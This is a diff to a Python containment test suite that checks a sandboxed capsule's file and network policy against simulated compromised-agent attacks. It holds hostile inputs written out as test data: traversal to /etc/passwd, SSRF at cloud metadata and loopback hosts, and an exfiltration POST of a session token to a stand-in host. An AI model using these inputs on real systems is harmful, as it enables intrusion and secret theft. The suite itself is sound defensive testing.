@@ -90,16 +90,23 @@ def denial_text(txt):
         return txt
 
 
-def put_policy(**over):
+def policy_doc(**over):
+    # file_root is relative to the capsule's data/ directory ("." = data/
+    # itself); absolute or escaping roots are refused at PUT time.
     pol = {
         "allow_stdout": True, "allow_stdin": False,
         "allow_file_read": True, "allow_file_write": True, "allow_network": True,
-        "file_root": DATA1, "allowed_hosts": ["example.invalid"],
+        "file_root": ".", "allowed_hosts": ["example.invalid"],
         "deny_private_networks": True, "max_execution_ms": 30000,
         "max_memory_bytes": 268435456,
     }
     pol.update(over)
-    st, txt = http("PUT", f"/tenants/{TENANT}/jobs/{JOB}/capsules/{CAPSULE}/policy", pol)
+    return pol
+
+
+def put_policy(**over):
+    st, txt = http("PUT", f"/tenants/{TENANT}/jobs/{JOB}/capsules/{CAPSULE}/policy",
+                   policy_doc(**over))
     assert st == 200, f"policy PUT failed ({st}): {txt}"
 
 
@@ -206,7 +213,7 @@ def main():
 
     capdir = os.path.join(store, "tenants", TENANT, "jobs", JOB, "capsules", CAPSULE)
     DATA1 = os.path.join(capdir, "data")
-    DATA2 = os.path.join(capdir, "data2")
+    DATA2 = os.path.join(DATA1, "sub2")
     os.makedirs(DATA1, exist_ok=True)
     os.makedirs(DATA2, exist_ok=True)
     with open(os.path.join(DATA1, "secret.txt"), "w") as f:
@@ -216,7 +223,7 @@ def main():
     print()
     print("=" * 78)
     print("SYNTA / LYCAN CONTAINMENT MATRIX")
-    print("A capsule doing what a compromised agent does — 13 attack vectors")
+    print("A capsule doing what a compromised agent does — 14 attack vectors")
     print("=" * 78)
     print(f"policy: file read+write ON, network ON, file_root=<capsule>/data,")
     print(f"        allowed_hosts=['example.invalid'], deny_private_networks=true")
@@ -254,12 +261,21 @@ def main():
     attack("R2", "readText ../../../../etc/passwd (traversal)", "read",
            "../../../../etc/passwd", "", "traversal denied")
 
-    # R3: second policy round — re-root file_root to data2, try absolute path
-    # into the OLD root. sandbox.rs rejects absolute paths before touching root.
-    put_policy(file_root=DATA2)
+    # R3: second policy round — re-root file_root to data/sub2, try an
+    # absolute path into the OLD root. sandbox.rs rejects absolute paths
+    # before touching root.
+    put_policy(file_root="sub2")
     attack("R3", "readText abs path into OLD file_root after re-root policy",
            "read", os.path.join(DATA1, "secret.txt"), "", "absolute paths denied")
     put_policy()
+
+    # R3b: the policy itself cannot widen the sandbox. An absolute file_root
+    # (here: the capsule directory, which holds policy.json and the logs)
+    # is refused at PUT time.
+    st, txt = http("PUT", f"/tenants/{TENANT}/jobs/{JOB}/capsules/{CAPSULE}/policy",
+                   policy_doc(file_root=capdir))
+    record("R3b", "policy PUT with an absolute file_root is refused",
+           "PASS" if st == 400 else "FAIL", f"http={st} {one_line(denial_text(txt), 90)}")
 
     attack("R4", "writeText ../..-escape (outside file_root)", "write",
            "../../../tmp/syntra-pwn-" + str(PORT) + ".txt", "pwned", "traversal denied")
@@ -286,43 +302,39 @@ def main():
                f"unexpected http={st} resp={txt}")
 
     attack("R6", "http.get cloud metadata 169.254.169.254", "get",
-           "http://169.254.169.254/latest/meta-data/", "", "not in allowed_hosts")
+           "https://169.254.169.254/latest/meta-data/", "", "not in allowed_hosts")
     put_policy(allowed_hosts=["example.invalid", "169.254.169.254"])
     attack("R6b", "same URL after allowlisting 169.254.169.254 — private-IP guard",
-           "get", "http://169.254.169.254/latest/meta-data/", "",
+           "get", "https://169.254.169.254/latest/meta-data/", "",
            "private network denied")
     put_policy()
 
     attack("R7", "http.get SSRF at own admin console 127.0.0.1:"
-           + str(PORT) + "/admin", "get", f"http://127.0.0.1:{PORT}/admin", "",
+           + str(PORT) + "/admin", "get", f"https://127.0.0.1:{PORT}/admin", "",
            "not in allowed_hosts")
     put_policy(allowed_hosts=["example.invalid", "127.0.0.1"])
     attack("R7b", "127.0.0.1 ALLOWED in hosts list — deny_private_networks still fires",
-           "get", f"http://127.0.0.1:{PORT}/admin", "", "private network denied")
+           "get", f"https://127.0.0.1:{PORT}/admin", "", "private network denied")
     put_policy(allowed_hosts=["example.invalid", "localhost"])
     attack("R7c", "localhost ALLOWED in hosts list — private/local host guard fires",
-           "get", f"http://localhost:{PORT}/admin", "", "private/local host denied")
+           "get", f"https://localhost:{PORT}/admin", "", "private/local host denied")
     put_policy()
 
-    attack("R8", "http.get RFC1918 10.0.0.7", "get", "http://10.0.0.7/", "",
+    attack("R8", "http.get RFC1918 10.0.0.7", "get", "https://10.0.0.7/", "",
            "not in allowed_hosts")
     put_policy(allowed_hosts=["example.invalid", "10.0.0.7"])
     attack("R8b", "10.0.0.7 ALLOWED in hosts list — private-IP guard fires", "get",
-           "http://10.0.0.7/", "", "private network denied")
+           "https://10.0.0.7/", "", "private network denied")
     put_policy()
 
     attack("R9", "http.post exfil to https://exfil.example.net/ (not allowlisted)",
            "post", "https://exfil.example.net/", "SESSION_TOKEN=deadbeef",
            "not in allowed_hosts")
 
-    # R10: does the allowlist distinguish http vs https? Read of
-    # src/capabilities/sandbox.rs: host is extracted from anything between
-    # "://" and "/", and matched exactly against allowed_hosts — the scheme
-    # is never consulted. Not a real guard, so we do not fake one.
-    record("R10", "scheme (http vs https) mismatch on an allowlisted host", "GAP",
-           "NOT ENFORCED by design: allowed_hosts is host-only (sandbox.rs "
-           "extracts host after '://' and matches it exactly; no scheme field "
-           "in policy). http:// and https:// to an allowed host are identical.")
+    # R10: the sandbox is https-only unless the policy opts in with
+    # allow_insecure_http, so an allowlisted host cannot be reached in the clear.
+    attack("R10", "plain http:// to an allowlisted host (https-only by default)",
+           "get", "http://example.invalid/", "", "plain http:// is denied")
 
     # R11: flip policy off via PUT, retry a previously-allowed call
     put_policy(allow_file_read=False)
@@ -330,7 +342,7 @@ def main():
            "secret.txt", "", "effect=file_read denied by policy")
     put_policy(allow_network=False)
     attack("R11b", "allow_network flipped OFF, retry http.get", "get",
-           "http://10.0.0.7/", "", "effect=network denied by policy")
+           "https://10.0.0.7/", "", "effect=network denied by policy")
     put_policy()
 
     # R12: compute budget. .lyc graphs are verifier-checked acyclic and the
@@ -424,9 +436,12 @@ def main():
   file: absolute-path reject, '..' reject, canonicalized containment for
   reads and writes (symlink-escape defeat), per-effect policy gates
   (file_read/file_write/network) checked before every capability call.
-  network: exact-host allowlist (empty list = deny all), private/loopback/
-  RFC1918/link-local/metadata IP deny incl. DNS-rebinding check,
-  redirects disabled under sandbox, 10s socket timeout, 1 MiB body caps.
+  network: https-only unless allow_insecure_http, exact-host allowlist
+  (empty list = deny all), private/loopback/RFC1918/CGNAT/link-local/
+  metadata IP deny (incl. IPv4-mapped IPv6), both checked inside the HTTP
+  client's resolver on the host it actually connects to (no DNS-rebinding
+  window), redirects disabled under sandbox, 10s socket timeout, 1 MiB
+  body caps. Only the operator admin key may set deny_private_networks=false.
   compute: max_execution_ms enforced by the graph executor (granularity:
   every 64 node evals — a single long kernel call is only caught at the
   next checkpoint; policy.json defaults the budget to 30000 ms when the
@@ -434,8 +449,7 @@ def main():
   audit: every executor error is appended to /audits as execution_denied
   (with the error string and graphHash) BEFORE the HTTP 500 is returned.
   surface: exec/env/process capabilities are not compiled into the runtime.
-* Documented gaps (printed above, not counted as passes, honestly):
-  R10 scheme-blind allowlist (host-only matching, unchanged by policy),
+* Documented gaps (not counted as passes):
   max_memory_bytes is parsed but NOT enforced anywhere (no memory cap),
   and (if observed) R5 symlink read behavior.""")
     if GAP:
